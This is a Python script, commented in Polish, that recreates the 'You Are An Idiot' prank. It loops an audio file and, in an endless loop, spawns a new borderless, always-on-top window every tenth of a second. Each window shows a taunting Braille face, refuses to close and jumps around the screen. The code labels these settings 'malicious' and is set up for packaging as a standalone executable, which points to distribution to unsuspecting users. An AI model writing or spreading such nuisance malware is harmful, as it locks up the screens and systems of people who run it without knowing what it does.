import sys
import os
import tkinter as tk
import random
import threading
import time
import pygame

def resource_path(relative_path):
    """ Pobiera ścieżkę do zasobów, działa dla dev i dla PyInstallera """
    try:
        # PyInstaller tworzy tymczasowy folder i przechowuje ścieżkę w _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# Twoje logo ASCII Braille
ASCII_LOGO = """
   YOU ARE AN IDIOT!
 
⠀⠀⠀⣀⣤⠤⠤⣤⣄⣀⠀⠀⠀
⠀⣠⡞⠉⠀⠀⠀⠀⠀⠉⠳⣄⠀
⢰⡏⠀⠰⣿⡷⠀⢿⣿⠆⠀⢹⣦
⢸⡃⠀⠀⠉⠁⠀⠈⠉⠀⠀⢸⣿
⠸⣇⠺⣦⡀⠀⠀⠀⢀⣴⠇⣸⠿
⠀⠻⣦⡈⠙⠓⠒⠛⠋⣁⣴⠏⠀
⠀⠀⠈⠙⠓⠶⠶⠶⠛⠋⠀⠀⠀
"""

# Inicjalizacja audio
pygame.mixer.init()

def play_audio():
    # Używamy resource_path, aby plik działał po spakowaniu do jednego EXE/binarki
    audio_path = resource_path("idiot.mp3")
    try:
        pygame.mixer.music.load(audio_path)
        pygame.mixer.music.play(-1) # Pętla nieskończona
    except Exception as e:
        # Fail-safe dla wersji deweloperskiej
        print(f"Błąd audio: {e}. Szukam lokalnie...")

def create_window():
    root = tk.Tk()
    
    # --- ZŁOŚLIWE USTAWIENIA ---
    root.overrideredirect(True)       # Usuwa pasek tytułu
    root.attributes("-topmost", True)  # Zawsze na wierzchu
    root.config(bg="white")
    
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    # Wyświetlanie logo
    label = tk.Label(
        root, 
        text=ASCII_LOGO, 
        font=("Courier", 12, "bold"), 
        fg="black", 
        bg="white",
        justify="center"
    )
    label.pack(padx=20, pady=20)

    def jump():
        try:
            sw = root.winfo_screenwidth()
            sh = root.winfo_screenheight()
            new_x = random.randint(0, sw - 250)
            new_y = random.randint(0, sh - 200)
            root.geometry(f"+{new_x}+{new_y}")
            root.after(200, jump)
        except:
            pass

    jump()
    root.mainloop()

def bomb():
    while True:
        thread = threading.Thread(target=create_window)
        thread.daemon = True
        thread.start()
        time.sleep(0.1) 

if __name__ == "__main__":
    # Ukryty start audio
    play_audio()
    
    # Start deszczu okienek
    try:
        bomb()
    except KeyboardInterrupt:
        pygame.mixer.music.stop()
        sys.exit()

